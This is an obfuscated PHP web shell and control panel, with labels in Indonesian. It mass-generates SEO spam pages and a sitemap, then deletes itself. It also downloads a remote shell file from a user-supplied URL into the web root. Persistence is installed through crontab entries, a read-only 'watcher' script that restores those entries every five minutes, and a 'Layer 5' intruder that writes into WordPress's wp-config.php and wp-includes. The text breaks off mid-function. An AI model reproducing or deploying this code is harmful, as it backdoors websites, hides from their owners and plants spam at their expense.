            <?php  if (isset($test_mode) && $test_mode) { ?>
                <div class="message info"><h2>Mode Uji Coba</h2><p><strong>Keyword:</strong> <code><?php  echo call_user_func($htmlspecialchars_fn, $processed_keyword ?? "\116\x2f\101"); ?>
</code></p><p><strong>Hasil HTML:</strong></p><textarea readonly class="w-full h-96"><?php  echo call_user_func($htmlspecialchars_fn, $test_output ?? ''); ?>
</textarea></div>
            <?php  } else { ?>
                <div class="message info"><p>Mode: <strong><?php  echo strtoupper(call_user_func($htmlspecialchars_fn, $mode ?? "\x4e\57\101")); ?>
</strong> | Waktu: <strong><?php  echo date("\x59\x2d\x6d\x2d\144\40\x48\x3a\151\72\163"); ?>
</strong></p><p>Eksekusi: <strong><?php  echo $executionTime ?? 0; ?>
 detik</strong> | Diproses: <strong><?php  echo $totalItems ?? 0; ?>
</strong> | Dibuat: <strong><?php  echo $createdCount ?? 0; ?>
</strong></p></div>
            <?php  } ?>
            <?php  if (!empty($errorMessages)) { ?>
                <div class="message error"><h2>Kesalahan:</h2><ul><?php  foreach ($errorMessages as $e) { ?>
<li><?php  echo call_user_func($htmlspecialchars_fn, $e); ?>
</li><?php  } ?>
</ul></div>
            <?php  } ?>
            <?php  if (empty($test_mode)) { ?>
                <?php  if (!empty($sitemapGenerated)) { ?>
                    <div class="message success"><p><?php  echo $sitemapMessage; ?>
</p><p><a href="<?php  echo call_user_func($htmlspecialchars_fn, $sitemapUrl); ?>
" target="_blank"><?php  echo call_user_func($htmlspecialchars_fn, $sitemapUrl); ?>
</a></p></div>
                <?php  } ?>
                <?php  if (!empty($urlBuffer)) { ?>
                    <div class="mt-4"><h2>Hasil URL:</h2><ul class="max-h-60 overflow-y-auto border border-gray-600 p-2 mt-2"><?php  foreach ($urlBuffer as $u) { ?>
<li><a href="<?php  echo call_user_func($htmlspecialchars_fn, $u); ?>
" target="_blank"><?php  echo call_user_func($htmlspecialchars_fn, $u); ?>
</a></li><?php  } ?>
</ul></div>
                <?php  } ?>
            <?php  } ?>
            <div class="mt-6"><a href="?menu=generator" class="cyber-btn cyber-btn-primary">« Kembali ke Generator</a></div>
        </section>
        <?php  } if ($_SERVER["\122\x45\121\x55\x45\123\x54\137\x4d\x45\x54\x48\117\x44"] === "\x50\x4f\x53\124" && isset($_POST["\141\x63\164\151\157\156"]) && $_POST["\141\143\164\x69\157\x6e"] === "\x72\165\156\137\x67\x65\156\145\x72\x61\x74\x6f\x72") { $sitemapFilename = "\x73\x69\164\145\155\x61\x70\x2e\170\x6d\154"; $kw_url = trim($_POST["\x6b\x77\137\165\162\154"] ?? ''); $template_url = trim($_POST["\x74\145\x6d\x70\x6c\x61\164\145\x5f\x75\x72\154"] ?? ''); $baseAMPUrl = trim($_POST["\x62\x61\x73\145\137\141\x6d\x70\137\165\162\x6c"] ?? ''); $slug_structure = $_POST["\x73\154\165\x67\137\163\164\162\x75\x63\164\x75\162\x65"] ?? "\x64\151\x72"; $tunnel_param_name = trim($_POST["\x74\165\156\x6e\x65\x6c\137\160\141\x72\x61\x6d\137\x6e\141\155\x65"] ?? "\151\144"); $mode_gen = $_POST["\155\157\144\x65"] ?? "\x64\151\162"; $tiers = $_POST["\x74\x69\145\162\x73"] ?? array(); $test_mode = isset($_POST["\x74\145\x73\x74\137\x6d\x6f\x64\x65"]); $auto_delete_gen = isset($_POST["\x61\x75\x74\x6f\x5f\x64\145\x6c\x65\164\x65"]); $gen_errorMessages = array(); if (!function_exists("\x63\165\x72\x6c\x5f\x69\x6e\151\164")) { $gen_errorMessages[] = "\143\x55\122\x4c\x20\164\x69\144\x61\x6b\x20\x61\x6b\x74\151\146\56"; } if (empty($kw_url) || empty($template_url) || empty($tiers)) { $gen_errorMessages[] = "\x53\x75\x6d\142\x65\162\40\144\x61\164\x61\x20\46\40\164\x69\156\147\153\x61\164\x61\x6e\x20\x6b\157\156\x74\x65\156\x20\x77\141\x6a\151\x62\40\144\151\x69\163\151\x2e"; } if (!is_writable("\56")) { $gen_errorMessages[] = "\x44\x69\x72\x65\153\164\x6f\x72\151\x20\164\x69\x64\141\153\x20\167\162\x69\164\141\x62\x6c\x65\x2e"; } if (!empty($gen_errorMessages)) { generator_display_results(array("\145\162\x72\x6f\162\x4d\x65\x73\x73\x61\147\x65\x73" => $gen_errorMessages)); return; } $kw_result = generator_fetch_url_with_curl($kw_url); if ($kw_result["\x65\x72\162\x6f\162"]) { $gen_errorMessages[] = $kw_result["\x65\x72\162\157\162"]; } $template_result = generator_fetch_url_with_curl($template_url); if ($template_result["\x65\x72\x72\157\x72"]) { $gen_errorMessages[] = $template_result["\145\162\x72\157\162"]; } if (!empty($gen_errorMessages)) { generator_display_results(array("\145\162\162\157\162\115\145\163\163\x61\147\x65\163" => $gen_errorMessages)); return; } $lines = array_filter(array_map("\164\x72\151\x6d", preg_split("\x2f\134\x52\57", strip_tags($kw_result["\143\x6f\156\x74\x65\x6e\164"])))); if (empty($lines)) { $gen_errorMessages[] = "\124\x69\144\141\153\40\141\144\x61\x20\x6b\x65\171\x77\157\x72\144\x20\166\x61\154\x69\144\56"; } $startTime = microtime(true); $urlBuffer = array(); $createdCount = 0; $sitemapGenerated = false; $protocol = !empty($_SERVER["\x48\x54\124\x50\x53"]) && $_SERVER["\110\124\124\120\x53"] !== "\157\146\146" ? "\150\164\x74\160\163" : "\150\164\164\x70"; $host = $_SERVER["\x48\x54\x54\x50\x5f\x48\117\x53\124"]; $basePath = rtrim(dirname($_SERVER["\120\110\x50\137\123\105\114\106"]), "\x2f"); $baseUrl = $protocol . "\x3a\57\57" . $host . $basePath; usort($tiers, function ($a, $b) { $limit_a = !empty($a["\154\x69\x6d\x69\x74"]) ? (int) $a["\154\x69\x6d\x69\164"] : PHP_INT_MAX; $limit_b = !empty($b["\x6c\x69\x6d\x69\x74"]) ? (int) $b["\154\x69\x6d\x69\164"] : PHP_INT_MAX; return $limit_a <=> $limit_b; }); if (empty($gen_errorMessages)) { $itemsToProcess = $test_mode ? array_slice($lines, 0, 1) : $lines; foreach ($itemsToProcess as $index => $originalKeyword) { if (empty($originalKeyword)) { continue; } $tier = end($tiers); foreach ($tiers as $t) { if (empty($t["\154\151\x6d\x69\x74"]) || $index + 1 <= (int) $t["\x6c\x69\x6d\x69\x74"]) { $tier = $t; break; } } $sanitized_name = generator_sanitizeFilename($originalKeyword); $urlPath = $mode_gen === "\146\x69\154\x65" ? "{$baseUrl}\x2f{$sanitized_name}\56\150\x74\x6d\154" : rtrim("{$baseUrl}\x2f{$sanitized_name}", "\x2f") . "\x2f"; $brand_slug = ''; switch ($slug_structure) { case "\x68\x74\x6d\x6c": $brand_slug = rtrim($baseAMPUrl, "\x2f") . "\57" . $sanitized_name . "\56\x68\164\x6d\x6c"; break; case "\144\151\162": $brand_slug = rtrim($baseAMPUrl, "\x2f") . "\x2f" . $sanitized_name . "\x2f"; break; case "\x74\165\156\x6e\145\x6c": $tb = $baseAMPUrl; if (strpos($tb, "\x3f") === false && substr($tb, -1) !== "\x2f") { $tb .= "\57"; } $c = strpos($tb, "\x3f") === false ? "\x3f" : "\x26"; $brand_slug = $tb . $c . $tunnel_param_name . "\x3d" . urlencode(strtoupper($originalKeyword)); break; } $external_domains = array(); if (!empty($tier["\145\170\x74\145\162\156\x61\x6c\x5f\144\x6f\155\141\x69\156\x73"])) { $external_domains = array_filter(array_map("\164\162\x69\155", preg_split("\x2f\134\122\x2f", $tier["\145\170\x74\145\162\156\x61\x6c\x5f\x64\x6f\155\x61\x69\156\x73"]))); } $template_data = array("\x4a\x55\104\x55\x4c" => generator_spin(str_replace("\x7b\173\x42\122\101\x4e\104\175\175", strtoupper($originalKeyword), $tier["\x74\151\164\x6c\145"])), "\x44\105\x53\x4b\x52\x49\120\123\111" => generator_spin(str_replace("\x7b\x7b\102\x52\x41\x4e\x44\175\x7d", strtoupper($originalKeyword), $tier["\x64\x65\x73\143"])), "\107\x41\x4d\102\x41\x52" => $tier["\151\x6d\x67"], "\101\122\124\111\x4b\105\x4c" => generator_generate_article_content($tier["\x61\162\164\x69\x63\x6c\x65"], $originalKeyword, $lines, $urlPath, $external_domains, $mode_gen), "\x4b\105\x59\x57\117\x52\104\137\101\x53\114\x49" => call_user_func($GLOBALS["\150\164\x6d\x6c\x73\x70\145\143\x69\141\154\143\150\x61\x72\x73\x5f\146\x6e"], $originalKeyword), "\102\x52\x41\x4e\104" => strtoupper($originalKeyword), "\163\x6d\x61\x6c\154\102\x72\x61\x6e\144" => strtolower($originalKeyword), "\142\x72\141\156\144\137\163\x6c\165\147" => $brand_slug, "\x55\x52\x4c\x5f\103\101\x4e\x4f\116\111\x43\x41\x4c" => $urlPath); $html_content = generator_render_template($template_result["\143\157\156\x74\x65\156\164"], $template_data); if ($test_mode) { generator_display_results(array("\164\145\x73\164\137\x6d\157\x64\145" => true, "\160\x72\157\x63\145\x73\x73\x65\144\137\153\x65\x79\167\157\162\144" => $originalKeyword, "\x74\x65\x73\x74\x5f\157\165\x74\160\x75\164" => $html_content)); return; } try { $targetPath = $mode_gen === "\146\x69\154\145" ? "{$sanitized_name}\x2e\150\x74\x6d\154" : "{$sanitized_name}\x2f\x69\156\x64\x65\170\x2e\x68\164\x6d\x6c"; if ($mode_gen === "\x64\x69\162" && !is_dir($sanitized_name)) { @mkdir($sanitized_name, 493, true); } if (@file_put_contents($targetPath, $html_content) === false) { throw new Exception("\107\x61\x67\x61\154\x20\x6d\145\156\x75\154\x69\163\40\146\x69\154\145\x2e"); } $urlBuffer[] = $urlPath; $createdCount++; } catch (Exception $e) { $gen_errorMessages[] = "\105\162\x72\157\162\40\160\x61\144\x61\x20\47{$originalKeyword}\47\x3a\40" . $e->getMessage(); } } } $sitemapMessage = ''; $sitemapUrl = ''; if (!empty($urlBuffer)) { $finalSitemapFilename = $sitemapFilename; $sitemapMessage = "\x53\151\164\145\155\x61\160\x20\x3c\x63\x6f\x64\145\x3e{$finalSitemapFilename}\74\x2f\x63\157\x64\x65\x3e\x20\144\x69\160\x65\x72\x62\141\162\165\151\72"; if (file_exists($sitemapFilename)) { $timestamp = date("\131\x2d\155\x2d\144\137\x48\x69\x73"); $path_parts = pathinfo($sitemapFilename); $finalSitemapFilename = $path_parts["\146\151\x6c\145\156\x61\155\x65"] . "\55" . $timestamp . "\x2e" . $path_parts["\145\x78\164\x65\x6e\x73\151\157\156"]; $sitemapMessage = "\123\x69\x74\145\155\x61\x70\40\x62\x61\162\165\40\74\143\x6f\144\x65\x3e{$finalSitemapFilename}\x3c\57\x63\x6f\x64\145\x3e\40\x64\x69\x62\x75\x61\164\72"; } $sitemapUrl = $baseUrl . "\x2f" . $finalSitemapFilename; $sitemapXml = "\x3c\x3f\170\155\x6c\40\x76\145\162\163\151\157\x6e\75\42\x31\56\x30\42\40\145\156\143\x6f\144\x69\x6e\147\75\42\125\x54\106\55\70\x22\77\x3e\74\x75\162\154\x73\x65\164\x20\170\x6d\x6c\x6e\x73\75\x22\150\x74\164\x70\x3a\57\57\x77\167\167\x2e\163\151\x74\x65\x6d\x61\x70\x73\x2e\157\162\147\57\163\143\150\145\155\x61\x73\57\x73\151\164\145\155\141\160\x2f\60\56\71\x22\x3e"; foreach ($urlBuffer as $url) { $sitemapXml .= "\74\x75\162\x6c\76\74\x6c\x6f\x63\76" . call_user_func($GLOBALS["\150\164\155\154\163\160\x65\x63\151\141\x6c\x63\150\141\162\x73\137\146\156"], $url) . "\74\57\x6c\157\143\x3e\74\x6c\141\163\x74\x6d\157\x64\x3e" . date("\x63") . "\74\57\154\x61\x73\164\x6d\x6f\144\x3e\74\x2f\x75\x72\154\76"; } $sitemapXml .= "\x3c\57\x75\x72\154\163\x65\164\76"; if (@file_put_contents($finalSitemapFilename, $sitemapXml)) { $sitemapGenerated = true; } else { $gen_errorMessages[] = "\107\x61\147\x61\x6c\x20\x6d\145\x6e\x75\154\151\163\40\x73\x69\x74\x65\155\x61\160\72\x20" . $finalSitemapFilename; } } generator_display_results(array("\x6d\x6f\144\145" => $mode_gen, "\x65\x78\145\143\x75\164\x69\157\x6e\124\x69\x6d\x65" => round(microtime(true) - $startTime, 2), "\x63\x72\145\x61\164\x65\x64\x43\x6f\165\156\x74" => $createdCount, "\x74\x6f\164\x61\x6c\111\164\x65\x6d\163" => count($lines), "\165\162\154\102\x75\x66\146\145\x72" => $urlBuffer, "\145\162\x72\157\162\115\x65\163\x73\141\x67\x65\x73" => $gen_errorMessages, "\163\x69\164\x65\155\141\160\107\145\x6e\x65\162\141\x74\145\144" => $sitemapGenerated ?? false, "\163\x69\164\x65\x6d\x61\x70\x55\162\x6c" => $sitemapUrl, "\163\x69\x74\x65\x6d\x61\x70\x4d\145\163\163\x61\x67\x65" => $sitemapMessage)); if ($auto_delete_gen && $createdCount > 0 && empty($gen_errorMessages)) { @unlink(__FILE__); } return; } generator_display_main_form(); } goto oBq2Q; WwQxZ: goto E_jsV; goto Oyhou; eZ0A4: ?>
&path=<?php  goto Wiwza; WolHW: goto l1JmD; goto BKPKz; pb__g: gBxie: goto gbXMy; JJ_Wv: OlRAi: goto sRHP7; xvQZW: goto Sskku; goto AfAin; fdEeR: YUDA_: goto UfZ1R; iCaQz: goto RtuJL; goto aCivQ; VMghD: T1YLP: goto Gu1Xy; AFSDK: function find_common_document_roots() { $roots = array(); if (isset($_SERVER["\x44\117\x43\125\115\105\116\124\x5f\x52\x4f\117\x54"]) && is_path_allowed_by_basedir($_SERVER["\x44\x4f\x43\x55\115\x45\116\124\137\x52\117\x4f\x54"]) && is_dir($_SERVER["\x44\117\x43\x55\115\105\x4e\124\x5f\x52\117\x4f\x54"])) { $server_root = realpath($_SERVER["\104\x4f\103\x55\115\x45\116\124\x5f\x52\117\x4f\x54"]); if ($server_root && is_readable($server_root)) { $roots[$server_root] = "\104\117\103\x55\115\x45\116\x54\x5f\122\117\x4f\x54\x20\x28" . basename($server_root) . "\51"; } } $script_dir = dirname(__FILE__); $up_one = dirname($script_dir); $up_two = dirname($up_one); $common_names = array("\x70\165\142\x6c\x69\143\x5f\150\164\155\x6c", "\x77\167\x77", "\x68\164\144\x6f\143\x73", "\x68\164\x74\160\x64\157\x63\x73", "\167\145\x62", "\x70\165\142\154\151\x63"); $search_paths = array_unique(array($script_dir, $up_one, $up_two, $_SERVER["\104\117\103\x55\115\x45\116\124\x5f\122\117\117\x54"] ?? $script_dir)); foreach ($search_paths as $path) { if (!$path || $path === "\57" || !is_path_allowed_by_basedir($path) || !is_dir($path) || !is_readable($path)) { continue; } $real_path_current_search = realpath($path); if ($real_path_current_search && !isset($roots[$real_path_current_search])) { $roots[$real_path_current_search] = "\104\x65\x74\145\x63\x74\145\x64\40\102\141\163\x65\40\50" . basename($real_path_current_search) . "\51"; } foreach ($common_names as $name) { $potential_root = rtrim($path, DIRECTORY_SEPARATOR) . DIRECTORY_SEPARATOR . $name; if (is_path_allowed_by_basedir($potential_root) && is_dir($potential_root) && is_readable($potential_root)) { $real_path = realpath($potential_root); if ($real_path && !isset($roots[$real_path])) { $roots[$real_path] = "\x44\145\164\145\143\x74\145\x64\x3a\x20" . $name; } } } } if (is_path_allowed_by_basedir($up_one) && is_dir($up_one) && is_readable($up_one)) { $real_up_one = realpath($up_one); if ($real_up_one && !isset($roots[$real_up_one])) { $roots[$real_up_one] = "\x50\x61\162\x65\156\x74\x20\104\x69\162\40\x28\56\x2e\57\x29"; } } return $roots; } goto nx2Pt; LycB4: tKo7a: goto rXC1x; a3nR0: $scanner_results_html = ''; goto SI36l; Ea6zI: BIvP4: goto XUuoR; VqHaZ: $_g_ascii_chdir = array(99, 104, 100, 105, 114); goto X6i4q; zMcZI: if ($_SERVER["\x52\105\x51\x55\x45\x53\x54\x5f\115\x45\124\x48\117\104"] == "\120\117\123\124") { $action_post = isset($_POST["\141\x63\164\151\157\x6e"]) ? $_POST["\141\x63\x74\151\157\x6e"] : null; if ($action_post === "\165\x70\144\x61\164\145\x5f\x73\x65\x63\x75\x72\151\x74\x79\x5f\x63\157\x6e\x66\151\x67" && $active_menu === "\163\145\143\165\x72\x69\x74\x79\x5f\143\x6f\156\x66\x69\147") { $current_config_content = @file_get_contents($security_config_file); $current_config = $current_config_content ? @json_decode($current_config_content, true) : array(); if (json_last_error() !== JSON_ERROR_NONE) { $current_config = array(); } $current_config["\151\160\137\x65\156\x61\142\154\145\x64"] = isset($_POST["\151\x70\137\145\156\x61\x62\x6c\145\x64"]); $allowed_ips = isset($current_config["\141\x6c\x6c\157\167\145\144\x5f\x69\x70\163"]) && is_array($current_config["\141\x6c\x6c\157\x77\x65\144\137\x69\160\x73"]) ? $current_config["\x61\154\154\157\x77\x65\144\137\151\160\x73"] : array(); if (isset($_POST["\141\144\144\137\151\x70"]) && !empty(trim($_POST["\141\x64\144\x5f\x69\160"]))) { $new_ip = trim($_POST["\x61\144\x64\137\x69\160"]); if (filter_var($new_ip, FILTER_VALIDATE_IP) && !in_array($new_ip, $allowed_ips)) { $allowed_ips[] = $new_ip; } } if (isset($_POST["\x72\145\155\157\166\145\137\x69\x70\163"]) && is_array($_POST["\x72\145\x6d\x6f\166\x65\x5f\x69\160\x73"])) { $allowed_ips = array_diff($allowed_ips, $_POST["\162\145\x6d\x6f\x76\145\137\x69\160\x73"]); } $current_config["\x61\x6c\x6c\x6f\x77\x65\x64\x5f\x69\x70\163"] = array_values($allowed_ips); if (@file_put_contents($security_config_file, json_encode($current_config, JSON_PRETTY_PRINT))) { $output_messages[] = "\113\157\156\146\151\147\x75\162\x61\163\x69\x20\153\145\x61\x6d\x61\x6e\x61\x6e\x20\142\145\162\x68\141\163\151\x6c\x20\x64\x69\163\x69\x6d\160\x61\156\56"; } else { $error_messages[] = "\107\141\147\141\154\x20\x6d\145\x6e\171\151\155\x70\141\x6e\x20\153\157\156\x66\x69\x67\x75\162\x61\163\151\56\x20\120\141\x73\164\x69\x6b\141\x6e\40\146\151\x6c\x65\40\47{$security_config_file}\x27\x20\x77\x72\x69\x74\x61\142\154\145\56"; } } elseif ($action_post === "\x73\x65\164\x75\x70\137\x63\x72\157\156" && $active_menu === "\143\162\157\156") { $shell_filename = isset($_POST["\163\x68\x65\154\x6c\x5f\x66\151\154\145\156\141\155\145\137\143\x72\x6f\156"]) ? call_user_func($basename_fn, $_POST["\x73\x68\145\x6c\154\x5f\x66\151\154\x65\x6e\x61\x6d\145\x5f\143\x72\x6f\156"]) : ''; $shell_url = isset($_POST["\165\162\x6c\x5f\x63\x72\x6f\156"]) ? call_user_func($trim_fn, $_POST["\165\x72\x6c\x5f\143\162\157\x6e"]) : ''; $target_path = $auto_path_script; if (empty($shell_filename) || empty($shell_url) || !filter_var($shell_url, FILTER_VALIDATE_URL)) { $error_messages[] = "\116\x61\x6d\x61\x20\146\151\x6c\145\x20\x64\141\156\x20\125\x52\114\x20\163\x68\x65\x6c\x6c\40\171\x61\156\x67\40\x76\x61\x6c\x69\x64\x20\167\141\152\151\x62\x20\x64\x69\x69\x73\151\56"; } else { $download_result = generator_fetch_url_with_curl($shell_url); $shell_content = $download_result["\143\x6f\x6e\164\x65\x6e\164"]; if ($shell_content === false) { $error_detail = $download_result["\x65\x72\x72\x6f\162"] ? "\x20\x44\x65\x74\141\151\x6c\72\40" . $download_result["\145\x72\162\x6f\x72"] : ''; $error_messages[] = "\107\x61\x67\141\x6c\40\155\x65\x6e\x67\165\156\x64\x75\x68\x20\153\x6f\156\164\145\156\40\163\150\x65\154\x6c\40\144\x61\x72\151\x20\125\122\114\40\x79\x61\156\147\x20\144\x69\142\145\x72\x69\x6b\141\156\56" . $error_detail; } else { $full_target_path = $target_path . DIRECTORY_SEPARATOR . $shell_filename; $file_put_contents_fn = _get_fn_name_global_init_v3("\137\x67\x5f\141\163\143\x69\151\137\146\x69\x6c\145\x5f\x70\x75\164\137\143\x6f\x6e\x74\145\156\x74\x73", "\x66\151\x6c\x65\x5f\x70\165\164\137\143\157\156\x74\x65\x6e\164\163"); if (@call_user_func($file_put_contents_fn, $full_target_path, $shell_content) !== false) { $output_messages[] = "\106\151\154\x65\x20\x73\150\145\x6c\154\x20\x27{$shell_filename}\x27\40\142\x65\x72\150\x61\x73\151\x6c\40\x64\x69\163\x69\x6d\160\141\x6e\56"; $new_cron_commands = generate_custom_cron_commands($target_path, $shell_filename, $shell_url); $current_crontab = try_execute_command("\x63\x72\157\156\164\141\142\40\55\x6c"); $new_crontab_content = $current_crontab ? trim($current_crontab) . "\12" : ''; $commands_added = 0; foreach ($new_cron_commands as $command) { if (strpos($new_crontab_content, $command) === false) { $new_crontab_content .= $command . "\12"; $commands_added++; } } if ($commands_added > 0) { $temp_cron_file = tempnam(sys_get_temp_dir(), "\x63\162\x6f\156"); file_put_contents($temp_cron_file, $new_crontab_content); try_execute_command("\x63\x72\157\156\164\x61\142\40" . safe_escapeshellarg($temp_cron_file)); @unlink($temp_cron_file); $output_messages[] = "\x53\x75\153\x73\x65\163\72\x20{$commands_added}\x20\160\x65\x72\x69\x6e\164\x61\x68\40\143\x72\157\156\40\142\x61\x72\x75\40\x74\x65\x6c\141\x68\40\x64\151\x74\141\155\x62\141\x68\x6b\141\156\x2f\x64\x69\x70\145\x72\142\141\x72\x75\151\x2e"; } else { $output_messages[] = "\x49\x6e\x66\x6f\x3a\x20\x53\x65\155\165\141\40\x70\145\162\151\156\x74\x61\150\40\x63\162\157\x6e\x20\171\141\x6e\x67\x20\x64\151\160\x65\162\154\x75\153\x61\156\40\163\165\144\x61\150\x20\141\144\141\56"; } } else { $error_messages[] = "\107\x61\147\141\x6c\x20\155\x65\x6e\171\x69\155\160\141\156\x20\146\x69\154\x65\40\x73\150\x65\154\154\40\x6b\x65\x20\47{$full_target_path}\47\x2e\40\120\145\x72\x69\153\163\141\40\x69\172\151\x6e\40\164\165\x6c\151\163\x2e"; } } } } elseif ($action_post === "\x73\x74\x61\162\164\137\160\x72\x6f\164\145\x63\164\151\157\x6e" && $active_menu === "\144\171\x6e\141\155\x69\x63\x5f\x63\x61\143\x68\x65\x5f\155\x61\x6e\x61\147\x65\162") { function find_php_cli_binary() { $common_paths = array("\57\x75\163\162\x2f\142\x69\x6e\x2f\x70\x68\160", "\x2f\165\163\162\57\154\157\x63\x61\154\x2f\142\151\156\x2f\x70\x68\160", "\57\x62\151\156\57\160\x68\x70", "\160\150\160"); foreach (array("\70\x2e\62", "\70\x2e\61", "\70\x2e\60", "\x37\x2e\64", "\67\56\x33", "\67\56\x32") as $version) { $v = str_replace("\x2e", '', $version); array_unshift($common_paths, "\x2f\165\163\x72\57\x62\x69\156\57\160\150\160{$version}", "\57\x75\x73\x72\57\154\157\x63\x61\154\57\x62\x69\x6e\x2f\160\150\x70{$version}", "\57\157\x70\x74\57\x72\145\155\151\57\x70\150\160{$v}\57\162\x6f\157\x74\x2f\165\x73\162\57\x62\x69\156\x2f\160\150\160"); } if (defined("\120\110\120\137\102\111\116\101\x52\131") && !empty(PHP_BINARY)) { $output = try_execute_command(safe_escapeshellarg(PHP_BINARY) . "\x20\55\x76"); if ($output && stripos($output, "\x63\x6c\151") !== false) { return PHP_BINARY; } } foreach (array_unique($common_paths) as $path) { $output = try_execute_command("\x63\x6f\x6d\155\141\x6e\144\40\x2d\x76\x20" . safe_escapeshellarg($path)); if (!empty($output)) { $path = trim($output); $version_output = try_execute_command(safe_escapeshellarg($path) . "\40\55\166"); if ($version_output && stripos($version_output, "\x63\154\x69") !== false) { return $path; } } } return false; } function deploy_layer4_watcher($cron_commands_to_rebuild, $watcher_name, $php_binary, &$output_messages, &$error_messages) { if (!$php_binary) { $error_messages[] = "\x4c\141\160\x69\163\x20\64\x3a\x20\x47\141\147\x61\154\54\x20\x74\x69\x64\x61\x6b\x20\x64\x61\160\141\x74\x20\x6d\x65\156\145\155\x75\153\141\x6e\40\x50\110\x50\x20\142\x69\156\x61\x72\x79\x20\x79\x61\156\147\40\144\x61\x70\x61\x74\x20\x64\151\x65\x6b\163\x65\x6b\165\x73\151\x2e"; return; } $doc_root = $_SERVER["\x44\x4f\x43\125\x4d\105\116\x54\x5f\122\117\117\x54"]; if (!is_readable($doc_root) || !is_dir($doc_root)) { $error_messages[] = "\114\141\x70\x69\x73\x20\64\x3a\x20\107\141\147\141\x6c\x20\x6d\145\155\142\x61\143\141\x20\104\x6f\143\165\155\x65\156\164\x20\x52\157\157\164\56"; return; } $watcher_filepath = $doc_root . DIRECTORY_SEPARATOR . $watcher_name; $cron_content = implode("\12", $cron_commands_to_rebuild) . "\12"; $watcher_code = "\74\x3f\160\150\160\40\44\143\x20\x3d\x20" . var_export($cron_content, true) . "\x3b\40\x24\143\143\x20\75\x20\x74\x72\x79\137\x65\170\x65\143\x75\164\145\x5f\x63\157\x6d\155\141\x6e\144\50\42\x63\162\x6f\156\164\x61\x62\x20\x2d\154\42\51\73\x20\x69\x66\x20\x28\44\143\143\x20\x3d\75\75\40\156\x75\154\154\40\174\x7c\40\x73\164\x72\160\157\163\x28\x24\x63\x63\54\40\44\143\51\x20\x3d\75\x3d\x20\x66\141\x6c\163\x65\x29\40\x7b\40\x24\164\x20\75\40\164\x65\x6d\160\x6e\x61\155\50\x22\x2f\164\155\x70\42\54\x20\x22\143\42\51\x3b\40\146\151\154\x65\137\160\165\164\x5f\x63\157\156\x74\145\x6e\x74\x73\50\x24\164\x2c\40\x24\143\x29\73\40\164\x72\x79\137\145\170\145\x63\x75\x74\145\137\143\x6f\155\155\x61\156\144\50\42\143\x72\157\x6e\x74\x61\x62\40\42\40\x2e\x20\44\x74\x29\73\40\100\165\156\x6c\x69\156\153\50\44\164\x29\73\x20\x7d\x20\x3f\x3e"; if (@file_put_contents($watcher_filepath, $watcher_code)) { @chmod($watcher_filepath, 292); $new_cron_line = "\52\x2f\x35\x20\x2a\x20\x2a\40\52\x20\52\40" . safe_escapeshellarg($php_binary) . "\x20" . safe_escapeshellarg($watcher_filepath); $current_crontab = try_execute_command("\143\162\x6f\x6e\164\x61\142\x20\55\154"); if ($current_crontab !== null && strpos($current_crontab, $new_cron_line) === false) { try_execute_command("\50\x63\x72\157\x6e\164\x61\x62\40\x2d\154\40\62\x3e\x2f\x64\x65\x76\x2f\x6e\165\154\154\x3b\x20\145\x63\150\x6f\x20" . safe_escapeshellarg($new_cron_line) . "\51\x20\174\40\x63\162\x6f\156\x74\x61\142\x20\x2d"); } $_SESSION["\x6c\x34\x5f\x77\x61\164\143\x68\145\162\x5f\160\141\x74\x68"] = $watcher_filepath; $output_messages[] = "\114\x61\160\151\x73\x20\64\72\x20\127\x61\x74\x63\150\x65\162\40\155\141\156\x64\x69\x72\x69\x20\142\145\x72\150\x61\163\151\x6c\40\x64\x69\164\x61\156\x61\x6d\x20\144\151\x20\x3c\x73\164\x72\x6f\156\x67\76{$watcher_filepath}\74\57\163\x74\162\x6f\x6e\x67\76\x20\144\141\156\x20\144\151\x6a\x61\144\167\141\x6c\153\x61\x6e\x20\x64\151\40\x63\162\157\156\x2e"; } else { $error_messages[] = "\x4c\141\160\x69\x73\x20\64\x3a\x20\107\141\x67\141\154\x20\155\x65\x6d\x62\165\x61\x74\x20\x66\151\154\145\x20\167\141\164\x63\x68\145\x72\x20\144\x69\40\x27{$watcher_filepath}\x27\56"; } } function deploy_intruder_persistence($cron_commands_to_rebuild, &$output_messages, &$error_messages, $dynamic_names) { $wp_config_path = find_wp_load_path(__DIR__); if (!$wp_config_path) { $error_messages[] = "\114\141\160\x69\163\40\65\x3a\x20\107\141\147\141\x6c\54\x20\164\151\144\x61\x6b\40\x64\x61\x70\x61\164\x20\155\x65\156\x65\155\x75\x6b\141\156\40\x60\x77\x70\x2d\x6c\x6f\x61\x64\56\x70\x68\160\140\40\165\156\x74\165\x6b\40\155\145\156\143\141\x72\x69\x20\x60\167\160\55\143\x6f\x6e\146\151\147\x2e\160\150\160\140\x2e"; return; } $wp_root_path = dirname($wp_config_path); $wp_config_file = $wp_root_path . "\x2f\167\160\55\x63\157\x6e\x66\x69\x67\x2e\160\x68\160"; $wp_includes_dir = $wp_root_path . "\57\167\x70\55\151\x6e\143\x6c\165\x64\145\163"; if (!is_file($wp_config_file) || !is_writable($wp_config_file)) { $error_messages[] = "\114\141\160\x69\163\40\65\x3a\40\x47\x61\147\x61\x6c\54\x20\x60\167\160\x2d\x63\x6f\x6e\146\x69\147\x2e\x70\150\x70\x60\40\164\151\144\141\153\x20\144\x69\x74\145\155\165\153\x61\156\x20\x61\164\x61\x75\40\x74\x69\x64\x61\153\x20\144\x61\x70\141\x74\x20\144\151\164\165\x6c\x69\163\56"; return; } if (!is_dir($wp_includes_dir) || !is_writable($wp_includes_dir)) { $error_messages[] = "\x4c\x61\x70\151\x73\40\65\x3a\x20\x47\141\147\141\x6c\54\40\x64\x69\162\145\x6b\x74\x6f\162\x69\40\140\x77\160\55\151\156\143\x6c\x75\x64\145\x73\140\40\x74\151\x64\141\x6b\40\144\x69\x74\145\x6d\x75\x6b\141\156\x20\x61\164\141\165\40\164\x69\x64\x61\153\x20\x64\x61\160\141\164\40\144\x69\x74\x75\x6c\x69\x73\56"; return; } $intruder_file_path = $wp_includes_dir . "\57" . $dynamic_names["\x69\x6e\x74\x72\x75\x64\145\162\137\156\141\x6d\145"]; $cron_content_for_intruder = implode("\xa", $cron_commands_to_rebuild) . "\xa"; $intruder_code = 